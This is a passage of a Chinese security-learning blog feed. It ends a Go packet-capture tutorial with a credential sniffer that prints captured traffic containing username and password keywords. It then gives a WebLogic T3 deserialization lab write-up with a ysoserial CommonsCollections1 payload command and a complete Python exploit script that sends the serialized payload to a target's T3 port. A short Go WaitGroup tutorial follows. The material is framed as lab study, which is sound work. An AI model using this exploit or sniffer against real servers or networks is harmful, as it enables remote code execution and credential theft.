Frame），它负责管理电脑通信设备和网络媒体之间的互通。包括了针脚、电压、线缆规范、集线器、中继器、网卡、主机接口卡等。</p><h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><ul><li>Layers()[]Layer<blockquote><p>返回数据包中的所有层</p></blockquote></li><li>Layer(LayerType) Layer<blockquote><p>根据传入的类型返回一个Layer的接口，如果不存在该Layer则返回nil</p></blockquote></li><li>LayerClass(LayerClass) Layer<blockquote><p>根据传入的LayerClass返回数据包的第一层</p></blockquote></li><li>ApplicationLayer() <blockquote><p>返回数据包的第一个应用层</p></blockquote></li><li>ErrorLayer()<blockquote><p>用于判断前面的解析是否出错</p></blockquote></li></ul><p>那么如何对捕获到的数据包进行解析，虽然刚刚捕获到的已经很清晰，但是我们还能利用packet提供的接口进行更加直观的表示。例如：</p><pre><code class="go">ethernetLayer := packet.Layer(layers.LayerTypeEthernet)    if ethernetLayer != nil &#123;        ethernet := ethernetLayer.(*layers.Ethernet)        fmt.Printf(&quot;Ethernet type:%v source MAC:%v destination MAC:%v\n&quot;, ethernet.EthernetType, ethernet.SrcMAC, ethernet.DstMAC)    &#125;</code></pre><p>如上代码我们通过Layer函数返回了一个数据链路层的接口类型，我们将鼠标移到上面观看具体的数据类型，现在就很简单明了了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtbrooiklkj61ig0m4wjd02.jpg" alt=""></p><p>诸如此类，我们在之前的代码上修改进行转换</p><pre><code class="go">package mainimport (    &quot;fmt&quot;    &quot;github.com/google/gopacket&quot;    &quot;github.com/google/gopacket/layers&quot;    &quot;github.com/google/gopacket/pcap&quot;    &quot;log&quot;    &quot;strings&quot;    &quot;time&quot;)var (    device = &quot;en0&quot;    snapshotLength int32 = 1024    promiscuous = false    timeout = 30 * time.Second    handle * pcap.Handle    err error)func main() &#123;    handle, err := pcap.OpenLive(device, snapshotLength, promiscuous, timeout)    if err != nil &#123;        log.Fatal(err)    &#125;    defer handle.Close()    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())    for packet := range packetSource.Packets()&#123;        processPacket(packet)        //fmt.Println(packet.Dump())        fmt.Println(strings.Repeat(&quot;-&quot;,50))    &#125;&#125;func processPacket(packet gopacket.Packet) &#123;    allLayers := packet.Layers()    for _, layer := range allLayers&#123;        fmt.Printf(&quot;layer:%v\n&quot;,layer.LayerType())    &#125;    fmt.Println(strings.Repeat(&quot;-&quot;, 50))    ethernetLayer := packet.Layer(layers.LayerTypeEthernet)    if ethernetLayer != nil &#123;        ethernet := ethernetLayer.(*layers.Ethernet)        fmt.Printf(&quot;Ethernet type:%v source MAC:%v destination MAC:%v\n&quot;, ethernet.EthernetType, ethernet.SrcMAC, ethernet.DstMAC)    &#125;    ipLayer := packet.Layer(layers.LayerTypeIPv4)    if ipLayer != nil &#123;        ipv4 := ipLayer.(*layers.IPv4)        fmt.Printf(&quot;protocol:%v Src IP:%v Dst IP:%v\n&quot;, ipv4.Protocol, ipv4.SrcIP, ipv4.DstIP)    &#125;    tcpLayer := packet.Layer(layers.LayerTypeTCP)    if tcpLayer != nil &#123;        tcp := tcpLayer.(*layers.TCP)        fmt.Printf(&quot;source port:%v dest port:%v\n&quot;, tcp.SrcPort, tcp.DstPort)    &#125;    udpLayer := packet.Layer(layers.LayerTypeUDP)    if udpLayer != nil &#123;        udp := udpLayer.(*layers.UDP)        fmt.Printf(&quot;source port:%v dest port:%v\n&quot;, udp.SrcPort, udp.DstPort)    &#125;    applicationLayer := packet.ApplicationLayer()    if applicationLayer != nil &#123;        fmt.Printf(&quot;application payload:%v\n&quot;,string(applicationLayer.Payload()))    &#125;    err := packet.ErrorLayer()    if err != nil &#123;        fmt.Println(err)    &#125;&#125;</code></pre><p>代码运行：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtbr7m4lk4j61260u0adq02.jpg" alt=""></p><h3 id="密码监听功能的编写"><a href="#密码监听功能的编写" class="headerlink" title="密码监听功能的编写"></a>密码监听功能的编写</h3><p>如果要加入密码监听功能则需要引入filter</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtbsmw42blj61dm0ecdhh02.jpg" alt=""></p><p>除了定义filter外还需要定义passList、userList</p><blockquote><p>userList = []string{“user”, “username”, “login”, “login_user”, “manager”, “user_name”, “usr”}</p></blockquote><blockquote><p>passList = []string{“pass”, “password”, “login_pass”, “pwd”, “passwd”}</p></blockquote><p>通过两个函数来判定数据包中是否存在用户名和密码</p><pre><code class="go">func checkPassword(payload []byte) (string, bool) &#123;    field := &quot;&quot;    result := false    for _,p := range passList &#123;        payload = []byte((strings.ToLower(string(payload))))        if bytes.Contains(payload, []byte(strings.ToLower(p)))&#123;            field = p            result = true            break        &#125;    &#125;    return field, result&#125;func checkUsername(payload []byte) (string, bool) &#123;    field := &quot;&quot;    result := false    for _,u := range userList &#123;        payload = []byte((strings.ToLower(string(payload))))        if bytes.Contains(payload,[]byte(strings.ToLower(u)))&#123;            field = u            result = true            break        &#125;    &#125;    return field,result</code></pre><p>最后完整代码如下：</p><pre><code class="go">func processPacket(packet gopacket.Packet) &#123;    var (        fromIp   string        destIp   string        srcPort  string        destPort string    )    ipLayer := packet.Layer(layers.LayerTypeIPv4)    if ipLayer != nil &#123;        ip, _ := ipLayer.(*layers.IPv4)        fromIp = ip.SrcIP.String()        destIp = ip.DstIP.String()    &#125;    tcpLayer := packet.Layer(layers.LayerTypeTCP)    if tcpLayer != nil &#123;        tcp, _ := tcpLayer.(*layers.TCP)        srcPort = tcp.SrcPort.String()        destPort = tcp.DstPort.String()    &#125;    applicationLayer := packet.ApplicationLayer()    if applicationLayer != nil &#123;        payload := applicationLayer.Payload()        if user, ok := checkUsername(payload); ok &#123;            _ = user            fmt.Printf(&quot;%v:%v-&gt;%v:%v, %v\n&quot;, fromIp, srcPort, destIp, destPort, string(payload))        &#125;        if pass, ok := checkPassword(payload); ok &#123;            _ = pass            fmt.Printf(&quot;%v:%v-&gt;%v:%v, %v\n&quot;, fromIp, srcPort, destIp, destPort, string(payload))        &#125;    &#125;&#125;</code></pre><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>如上仅仅只是个人学习笔记，没有代码编写的分析，因为也不是我写的，但是都有认真的自己敲一遍，去了解笔者的思路。</p>]]></content>
    
    <summary type="html">
    
      go
    
    </summary>
    
    
      <category term="go" scheme="http://yoursite.com/categories/go/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="go" scheme="http://yoursite.com/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic T3 反序列化学习</title>
    <link href="http://yoursite.com/2021/08/03/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/08/03/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-08-03T02:40:01.000Z</published>
    <updated>2021-08-03T02:44:24.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Weblogic-T3-反序列化学习"><a href="#Weblogic-T3-反序列化学习" class="headerlink" title="Weblogic T3 反序列化学习"></a>Weblogic T3 反序列化学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在公司实习也没有太多事情，就来学习一下Weblogic听好多师傅讲过很多次了。</p><p>这里我使用的是<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">ATEAM大哥开源的搭建工具</a>，感谢前人提供的便捷。我这里本来打算在自己电脑上搭建，但是说多了都是泪，m1适配问题。。。。最后还是跑云服务器上进行了搭建。</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><p>先从GitHub上面拉取项目，拉取之后创建两个文件夹jdks,weblogics。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswpmihim7j31660l60wu.jpg" alt=""></p><ul><li>jdk下载地址： <a href="https://www.oracle.com/technetwork/java/javase/archive-139210.html">https://www.oracle.com/technetwork/java/javase/archive-139210.html</a></li><li>weblogic下载地址：<a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html">https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</a></li></ul><p>然后将文件夹放到云服务器上后。</p><h3 id="镜像搭建"><a href="#镜像搭建" class="headerlink" title="镜像搭建"></a>镜像搭建</h3><blockquote><p>sudo docker build –build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz –build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .</p></blockquote><blockquote><p>docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 –name weblogic1036jdk7u21 weblogic1036jdk7u21</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswpv8yayyj313m0q0n2c.jpg" alt=""></p><p>ps: 如果失败了就多输几次</p><blockquote><p>mkdir ./weblogic1036</p><p>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./weblogic1036/</p><p>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./weblogic1036</p><p>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./weblogic1036/</p></blockquote><p>搭建完成访问：<a href="http://ip:7001/console/login">http://ip:7001/console/login</a></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswqirgplgj31u20u0jv6.jpg" alt=""><br>落泪了QAQ</p><h3 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h3><p>然后将weblogic1036文件夹从服务器上拖回本地主机<br>使用IDEA打开weblogic1036文件夹下的wlserver<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswq8gxqf5j30kc0g8jrz.jpg" alt=""><br>同时再将目录下的另外两个文件夹添加进Libraries中<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswqas2xsmj311a0u076x.jpg" alt=""><br>最后server-&gt;lib-&gt;Add as Library<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswqcc7tj0j30u0188wiv.jpg" alt=""><br>导入依赖后添加Remote JVM Debug 将Port设置成为8453.</p><p>PS：别忘记打开云服务器端口<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswqfzonx4j31300u0jut.jpg" alt=""></p><p>至此如果如下显示就成功了，如果错误看看防火墙端口有没有打开<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswqp4mq2mj316s06uaaf.jpg" alt=""></p><h2 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h2><p>这个我对着源码看还是一知半解，后面再仔细研究一下。这里是大佬的分析：<a href="https://www.cnblogs.com/potatsoSec/p/14378757.html">https://www.cnblogs.com/potatsoSec/p/14378757.html</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打开Wireshark，搜索 ac ed 00 05这是反序列化头的标志，具体的可以看这个类java.io.ObjectStreamConstants<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt3e8pibc0j30rc0wsmzp.jpg" alt=""><br>然后按照下图右键搜索到的包-》追踪流-〉TCP流<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2j9b3eksj30l00ma0v6.jpg" alt=""></p><p>可以明显的看见头部是T3协议的的包，然后接下来服务器返回helo包，我们将他转换成16进制更加直观的观察<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2is2m9txj30u00u6qax.jpg" alt=""><br>第一个包发送t3和版本号以及AS、HL等字段，服务器返回HELO包和服务器版本号进行协商<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2ivyqyu2j30u00u6ds5.jpg" alt=""><br>我们观察我们的脚本可以看见中间的那一段便是我们替换掉的cc1的序列化字节，从而造成反序列化攻击。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2jq4lkdvj31ep0u0wuk.jpg" alt=""><br>接下来是我进行远程debug</p><p>我们看补丁的位置：</p><pre><code>wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrevwlthint3client.jar:weblogic.rjvm.MsgAbbrevInputStreamweblogic.jar:weblogic.iiop.Utils</code></pre><p>这里我们就直接走InboundMsgAbbrev中的readObject下断点，看见第一行通过read函数给var2赋值我们跟进<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2h8gczdmj31c00u0n2s.jpg" alt=""><br>跟进以后经过几次跳转会来到这个位置，这个位置是对数据流进行分块处理，往后执行就是将反序列化流依次进行分块，最后依次解析每中的类<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt3c4ve8okj30ra0isgmw.jpg" alt=""><br>我们直接在InboundMsgAbbrev#resolveClass()方法下个断点，这个也是打补丁的地方，resolveClass就是将类描述符加工成该类的class对象<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt3cqcvaf4j31fu0g20vu.jpg" alt=""></p><p>这里是根据反序列化流解析类的具体流程<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt3dhj16zej31c00u0wnf.jpg" alt=""></p><p>java.io.ObjectStreamClass.lookup(Class&lt;?&gt; cl) 方法找到该描述符为可序列化的类。创建一个ObjectStreamClass实例，如果一个尚不存在的类。如果指定的类没有实现java.io.Serializable或java.io.Externalizable，则返回null。</p><p>同时weblogic也存在commoncollection3.2且Java为7u2<br>1的jar包因此可以直接使用cc1进行攻击<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2g1l2yhlj30vo0o2795.jpg" alt=""><br>这里先更换Java环境<br>使用命令生成cc1的序列化文件</p><blockquote><p>java -jar ysoserial.jar CommonsCollections1 “touch /tmp/success.txt” &gt; payload.tmp</p></blockquote><h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><pre><code class="python">#!/usr/bin/pythonimport socketimport structimport syssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server_address = (sys.argv[1], int(sys.argv[2]))print &#39;connecting to %s port %s&#39; % server_addresssock.connect(server_address)# Send headersheaders=&#39;t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n&#39;print &#39;sending &quot;%s&quot;&#39; % headerssock.sendall(headers)data = sock.recv(1024)print &gt;&gt;sys.stderr, &#39;received &quot;%s&quot;&#39; % datapayloadObj = open(sys.argv[3],&#39;rb&#39;).read()payload=&#39;\x00\x00\x09\xe4\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00&#39;payload=payload+payloadObjpayload=payload+&#39;\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78&#39;print &#39;sending payload...&#39;payload = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(struct.pack(&#39;!i&#39;, len(payload)), payload[4:])#print len(payload)outf = open(&#39;pay.tmp&#39;,&#39;w&#39;)outf.write(payload)outf.close()sock.send(payload)</code></pre><p>最后进行攻击</p><blockquote><p>python exp.py ip 7001 payload.tmp</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2g2mfhz5j316k036jri.jpg" alt=""></p><p>进入docker的命令行后，观察/tmp目录的变化<br>进入docker命令行的命令：</p><blockquote><p>docker exec -it CONTAINER ID  /bin/bash<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gt2h5095f1j31a406qdhl.jpg" alt=""></p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面是我对weblogic早期漏洞的浅显的分析，希望慢慢的经过学习，能够慢慢进步，现在感觉和最开始相比个人觉得收获还是蛮大的。</p>]]></content>
    
    <summary type="html">
    
      Weblogic T3 反序列化学习
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>Golang学习笔记 sync.WaitGroup</title>
    <link href="http://yoursite.com/2021/08/01/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20sync.WaitGroup/"/>
    <id>http://yoursite.com/2021/08/01/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20sync.WaitGroup/</id>
    <published>2021-08-01T07:00:01.000Z</published>
    <updated>2021-08-03T02:51:45.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Golang学习笔记-sync-WaitGroup"><a href="#Golang学习笔记-sync-WaitGroup" class="headerlink" title="Golang学习笔记 sync.WaitGroup"></a>Golang学习笔记 sync.WaitGroup</h1><p>go语言是原生支持并发的语言，在学习并发之前，我们先来学习一下进程、线程以及协程的概念。下面的内容取至《计算机操作系统基础》</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>  我们都知道计算机的核心是CPU，它承担了所有的计算任务；而操作系统是计算机的管理者，它负责任务的调度、资源的分配和管理，统领整个计算机硬件；应用程序则是具有某种功能的程序，程序是运行于操作系统之上的。</p><p>  进程是一个具有一定独立功能的程序在一个数据集上的一次动态执行的过程，是操作系统进行资源分配和调度的一个独立单位，是应用程序运行的载体。进程是一种抽象的概念，从来没有统一的标准定义。</p><p>进程一般由程序、数据集合和进程控制块三部分组成。</p><p>程序用于描述进程要完成的功能，是控制进程执行的指令集；<br>数据集合是程序在执行时所需要的数据和工作区；<br>程序控制块(Program Control Block，简称PCB)，包含进程的描述信息和控制信息，是进程存在的唯一标志。<br>进程具有的特征：</p><p>动态性：进程是程序的一次执行过程，是临时的，有生命期的，是动态产生，动态消亡的；<br>并发性：任何进程都可以同其他进程一起并发执行；<br>独立性：进程是系统进行资源分配和调度的一个独立单位；<br>结构性：进程由程序、数据和进程控制块三部分组成。</p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>  在早期的操作系统中并没有线程的概念，进程是能拥有资源和独立运行的最小单位，也是程序执行的最小单位。任务调度采用的是时间片轮转的抢占式调度方式，而进程是任务调度的最小单位，每个进程有各自独立的一块内存，使得各个进程之间内存地址相互隔离。</p><p>  后来，随着计算机的发展，对CPU的要求越来越高，进程之间的切换开销较大，已经无法满足越来越复杂的程序的要求了。于是就发明了线程。</p><p>  线程是程序执行中一个单一的顺序控制流程，是程序执行流的最小单元，是处理器调度和分派的基本单位。一个进程可以有一个或多个线程，各个线程之间共享程序的内存空间(也就是所在进程的内存空间)。一个标准的线程由线程ID、当前指令指针(PC)、寄存器和堆栈组成。而进程由内存空间(代码、数据、进程空间、打开的文件)和一个或多个线程组成。</p><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>协程，英文Coroutines，是一种基于线程之上，但又比线程更加轻量级的存在，这种由程序员自己写程序来管理的轻量级线程叫做『用户空间线程』，具有对内核来说不可见的特性。</p><p>因为是自主开辟的异步任务，所以很多人也更喜欢叫它们纤程（Fiber），或者绿色线程（GreenThread）。正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。</p><h2 id="sync-waitGroup"><a href="#sync-waitGroup" class="headerlink" title="sync.waitGroup"></a>sync.waitGroup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>waitGroup有一个内置的计数器，最初从0开始。它具有三个方法Add(),Done(),Wait()。Add()计数器加1，Done()计数器减1，Wait()阻塞代码运行，直到计数器为0.</p><p>直白的说就是一堆小弟在干活，干完活就跑到一个通道里面发送一个空消息，老大在通道等着小弟们的汇报。来一个小弟就记录一个小弟干完了活，直到记录的小弟干完活的数量等于小弟的人数就完成了。</p><p>下面是不使用sync.waitGroup的代码实现：</p><pre><code class="go">works := 3ch := make(chan struct&#123;&#125;)work := func()&#123;    // 搬砖    ch &lt;- struct&#123;&#125; //    通知老大&#125;leader := func() &#123;  cnt := 0  for range ch &#123;    cnt++    if cnt == workers &#123;      break    &#125;  &#125;  close(ch)  // 检查工作成果&#125;go leader()for i := 0; i &lt; workers; i++ &#123;  go worker()&#125;</code></pre><p>那么如果采用sync.waitGroup则</p><pre><code class="go">wg := &amp;sync.WaitGroup&#123;&#125;workers := 3wg.Add(workers)worker := func() &#123;  defer wg.Done()  // 干活&#125;leader := func() &#123;  wg.Wait()  // 检查工作成果&#125;go leader()for i := 0; i &lt; workers; i++ &#123;  go worker()&#125;</code></pre>]]></content>
    
    <summary type="html">
    
      go
    
    </summary>
    
    
      <category term="go" scheme="http://yoursite.com/categories/go/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="go" scheme="http://yoursite.com/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队评估实战靶场（一） 练习</title>
    <link href="http://yoursite.com/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/</id>
    <published>2021-07-24T11:31:01.000Z</published>
    <updated>2021-07-29T08:37:07.194Z</updated>
    
